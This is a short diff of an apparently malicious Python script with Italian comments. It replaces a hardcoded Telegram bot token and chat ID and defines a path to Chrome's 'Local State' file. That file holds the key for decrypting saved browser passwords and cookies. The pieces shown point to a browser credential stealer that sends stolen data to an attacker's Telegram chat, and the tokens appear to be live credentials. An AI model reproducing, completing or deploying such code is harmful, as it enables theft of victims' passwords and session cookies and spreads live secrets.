@@ -11,10 +11,10 @@ import shutil
 import csv
 
 # Token del tuo bot Telegram
-TELEGRAM_BOT_TOKEN = '7051484543:AAGqHyAjg8H1XGKXbhDqyP8VVlhjv6vDWQg'
+TELEGRAM_BOT_TOKEN = '8156603707:AAGJe4ldLvdZ1PBEGjLYFZIcm_Ef1lxse9M'
 
 # Chat ID della tua conversazione Telegram
-TELEGRAM_CHAT_ID = '6963998254'
+TELEGRAM_CHAT_ID = '8156603707'
 
 # GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % os.environ['USERPROFILE'])
